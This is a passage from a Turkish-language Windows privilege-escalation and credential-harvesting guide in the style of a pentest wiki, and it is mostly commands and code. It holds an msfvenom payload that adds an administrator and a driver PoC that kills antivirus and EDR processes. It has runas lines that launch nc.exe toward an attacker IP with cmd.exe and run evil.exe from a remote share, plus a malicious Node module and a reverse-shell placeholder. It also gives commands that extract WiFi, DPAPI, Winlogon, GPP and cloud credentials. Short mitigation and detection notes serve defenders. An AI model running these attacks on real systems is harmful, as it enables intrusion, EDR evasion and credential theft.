Örneğin, _C:\Program Files\Some Folder\Service.exe_ path'i için Windows şunları çalıştırmayı dener:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows servislerine ait olanlar hariç tüm tırnaksız service path'leri listele:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` Bir service binary’sini metasploit ile manuel olarak oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows, kullanıcıların bir servis başarısız olursa alınacak aksiyonları belirtmesine izin verir. Bu özellik bir binary’ye işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilir ise, privilege escalation mümkün olabilir. Daha fazla ayrıntı [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) içinde bulunabilir.

## Applications

### Installed Applications

**binary'lerin permissions**’ını (belki birini overwrite edip privileges yükseltebilirsiniz) ve **folders**’ı ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı config dosyasını değiştirerek bazı özel dosyayı okuyup okuyamayacağını veya bir Administrator hesabı tarafından yürütülecek bir binary dosyasını değiştirip değiştiremeyeceğini kontrol et (schedtasks).

Sistemde zayıf folder/files permissions bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörleri altındaki herhangi bir plugin DLL'sini otomatik olarak yükler. Eğer yazılabilir bir portable/copy kurulum varsa, kötü amaçlı bir plugin bırakmak, her başlatmada `notepad++.exe` içinde otomatik code execution sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Başka bir user tarafından execute edilecek bir registry veya binary üzerine overwrite yapıp yapamayacağını kontrol et.**\
**Privilege escalation için ilginç **autoruns** locations hakkında daha fazla bilgi edinmek için aşağıdaki sayfayı oku:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Olası **third party weird/vulnerable** driver'ları ara
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver keyfi bir kernel read/write primitive açığa çıkarıyorsa (kötü tasarlanmış IOCTL handler’larda yaygındır), kernel memory içinden doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için buraya bakın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call’ın attacker-controlled bir Object Manager path açtığı race-condition bug’larında, lookup işlemini bilerek yavaşlatmak (max-length component’ler veya deep directory chains kullanarak) pencereyi microsecond’lardan onlarca microsecond’a uzatabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities deterministic layout’lar oluşturmaya, writable HKLM/HKU descendants’ı abuse etmeye ve metadata corruption’ı custom driver olmadan kernel paged-pool overflow’larına dönüştürmeye izin verir. Tam zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver’lar device object’lerini IoCreateDeviceSecure ile güçlü bir SDDL kullanarak oluşturur ama DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarını yapmayı unutur. Bu flag olmadan, secure DACL device ekstra bir component içeren bir path üzerinden açıldığında uygulanmaz; bu da herhangi bir unprivileged kullanıcının şu gibi bir namespace path kullanarak handle elde etmesine izin verir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadaki bir vakadan)

Bir kullanıcı device’ı açabildiğinde, driver’ın açığa çıkardığı privileged IOCTL’ler LPE ve tampering için abuse edilebilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- Arbitary process’lere full-access handle döndürmek (DuplicateTokenEx/CreateProcessAsUser ile token theft / SYSTEM shell).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitrary process’leri terminate etmek, kernel üzerinden user land’den AV/EDR kill yapılmasına izin vermek.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için mitigasyonlar
- Bir DACL ile kısıtlanması amaçlanan device object’leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıran context’ini doğrulayın. Process termination veya handle dönüşlerine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs’yi kısıtlayın (access masks, METHOD_*, input validation) ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli device adlarına yapılan user-mode opens’i (ör. \\ .\\amsdk*) ve abuse gösterebilecek belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist’ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny list’lerinizi sürdürün.


## PATH DLL Hijacking

Eğer **PATH içinde bulunan bir klasörde write permissions** varsa, bir process tarafından yüklenen bir DLL’i hijack edebilir ve **privileges** yükseltebilirsiniz.

PATH içindeki tüm klasörlerin permissions’larını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Daha fazla bilgi için bu kontrolü nasıl kötüye kullanacağınız:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron module resolution hijacking

Bu, **Windows uncontrolled search path** çeşididir ve **Node.js** ile **Electron** uygulamalarını, `require("foo")` gibi yalın bir import yaptıklarında ve beklenen module **eksik** olduğunda etkiler.

Node, paketleri dizin ağacında yukarı doğru ilerleyerek ve her üst dizinde bulunan `node_modules` klasörlerini kontrol ederek çözer. Windows’ta bu tarama sürücü kök dizinine kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları sorgulayabilir:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Eğer **düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package klasörü) yerleştirip bir **daha yüksek ayrıcalıklı Node/Electron process** eksik dependency’yi çözdüğünde bunu bekleyebilirler. Payload, kurban process’in security context’i içinde çalışır; bu yüzden hedef bir administrator olarak, yükseltilmiş bir scheduled task/service wrapper içinden ya da otomatik başlayan ayrıcalıklı bir desktop app olarak çalışıyorsa bu durum **LPE** olur.

Bu özellikle şu durumlarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlanmışsa
- üçüncü taraf bir library `require("foo")` çağrısını `try/catch` ile sarıyor ve hata durumunda devam ediyorsa
- bir package production build’lerinden kaldırılmışsa, packaging sırasında eklenmemişse veya kurulamamışsa
- savunmasız `require()` ana application code içinde değil, dependency tree’nin derinliklerinde yer alıyorsa

### Savunmasız hedefleri bulma

Çözümleme yolunu doğrulamak için **Procmon** kullanın:

- `Process Name` filtresi = hedef executable (`node.exe`, Electron app EXE’si veya wrapper process)
- `Path` filtresi `contains` `node_modules`
- `NAME NOT FOUND` ve `C:\node_modules` altındaki son başarılı open’a odaklanın

Açılmış `.asar` dosyalarında veya application sources içinde faydalı code-review pattern’leri:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Sömürü

1. Procmon veya kaynak incelemesinden **eksik paket adını** belirleyin.
2. Eğer henüz mevcut değilse root lookup dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Beklenen tam adla bir module bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` yapmaya çalışır ve meşru modül mevcut değilse, Node `C:\node_modules\foo.js` yükleyebilir.

Bu kalıba uyan eksik optional modules için gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur, ancak **technique** yeniden kullanılabilir olan kısımdır: ayrıcalıklı bir Windows Node/Electron process tarafından çözümlenecek herhangi bir **missing bare import** bulun.

### Detection and hardening ideas

- Bir user `C:\node_modules` oluşturduğunda veya oraya yeni `.js` dosyaları/packages yazdığında alert verin.
- Yüksek integrity process'lerin `C:\node_modules\*` içinden okumasını hunt edin.
- Üretimde tüm runtime dependencies'i package edin ve `optionalDependencies` kullanımını audit edin.
- Üçüncü taraf code içinde sessiz `try { require("...") } catch {}` pattern'lerini review edin.
- Library destekliyorsa optional probes'ları disable edin (örneğin, bazı `ws` deployments legacy `utf-8-validate` probe'unu `WS_NO_UTF_8_VALIDATE=1` ile avoid edebilir).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **restricted services** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Firewall ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Daha fazlası[ ağ keşfi için komutlar burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde de bulunabilir

Root user alırsanız herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemek istediğinizde, GUI üzerinden `nc`’nin firewall tarafından izinli olup olmaması gerektiğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz

`WSL` dosya sistemini şu klasörde keşfedebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, kullanıcı kimlik bilgilerini Windows’un kullanıcıları otomatik olarak giriş yapabildiği sunucular, web siteleri ve diğer programlar için saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini saklayıp tarayıcılar üzerinden otomatik giriş yapabilmeleri gibi görünebilir. Ancak durum böyle değil.

Windows Vault, Windows’un kullanıcıları otomatik olarak giriş yapabildiği kimlik bilgilerini saklar; bu da, kimlik bilgilerine bir kaynağa erişmek için ihtiyaç duyan herhangi bir **Windows application that needs credentials to access a resource** (sunucu veya bir web sitesi) **bu Credential Manager** ve Windows Vault’u kullanabilir ve kullanıcıların sürekli kullanıcı adı ve şifre girmesi yerine sağlanan kimlik bilgilerini kullanabilir anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmedikçe, belirli bir kaynak için kimlik bilgilerini kullanmalarının mümkün olduğunu sanmıyorum. Bu yüzden, uygulamanız vault’u kullanmak istiyorsa, bir şekilde **credential manager ile iletişim kurmalı ve varsayılan storage vault’tan o kaynak için kimlik bilgilerini istemelidir**.

Makinede saklanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Daha sonra kayıtlı kimlik bilgilerini kullanmak için `/savecred` seçenekleriyle `runas` kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan bir kimlik bilgisi kümesiyle `runas` kullanımı.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sistemi içinde asimetrik private keys'lerin simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkı sağlamak için bir user veya system secret kullanır.

**DPAPI, key'lerin kullanıcının login secrets'lerinden türetilen bir symmetric key ile şifrelenmesini sağlar**. System encryption içeren senaryolarda, sistemin domain authentication secrets'lerini kullanır.

DPAPI kullanılarak şifrelenmiş user RSA keys, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}`, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **Kullanıcının private keys'lerini aynı dosyada koruyan master key ile birlikte bulunan DPAPI key**, tipik olarak 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, bu nedenle CMD içinde `dir` komutuyla içeriğinin listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmamak önemlidir).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey` ilgili argümanlarla (`/pvk` veya `/rpc`) bunu çözmek için kullanılabilir.

**master password** ile korunan **credentials files** genellikle şurada bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred` ile uygun `/masterkey` kullanarak şifreyi çözebilirsiniz.\
**memory** içinden `sekurlsa::dpapi` module ile birçok **DPAPI** **masterkeys** çıkarabilirsiniz (eğer root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** çoğu zaman **scripting** ve automation görevlerinde, şifrelenmiş credentials’ları pratik şekilde saklamak için kullanılır. Bu credentials, **DPAPI** kullanılarak korunur; bu da genellikle sadece aynı kullanıcı tarafından, oluşturuldukları aynı computer üzerinde decrypt edilebilecekleri anlamına gelir.

Bir PS credentials’ını onu içeren dosyadan **decrypt** etmek için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının var olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** için savunmasızdır.
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Kimlik Bilgileri)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry'de SSH keys

SSH private keys, registry anahtarı `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o yol içinde herhangi bir girdi bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifreli olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve ssh üzerinden bir makineye giriş yapmaya çalıştım. `HKCU\Software\OpenSSH\Agent\Keys` registry’si mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ayrıca bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın

### Cached GPP Pasword

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel local administrator hesaplarının dağıtılmasına izin veren bir özellik mevcuttu. Ancak bu yöntem ciddi güvenlik açıklarına sahipti. İlk olarak, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs), herhangi bir domain user tarafından erişilebiliyordu. İkinci olarak, bu GPP'ler içindeki passwords, publicly documented default key kullanılarak AES256 ile şifrelenmiş olsa da, herhangi bir authenticated user tarafından decrypt edilebiliyordu. Bu, users'ların elevated privileges elde etmesine yol açabileceği için ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren locally cached GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda, işlev password'u decrypt eder ve özel bir PowerShell object döndürür. Bu object, GPP ve dosyanın konumu hakkında ayrıntılar içerir; bu da bu security vulnerability'nin belirlenmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` içinde veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ içinde arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'u decrypt etmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak şifreleri almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
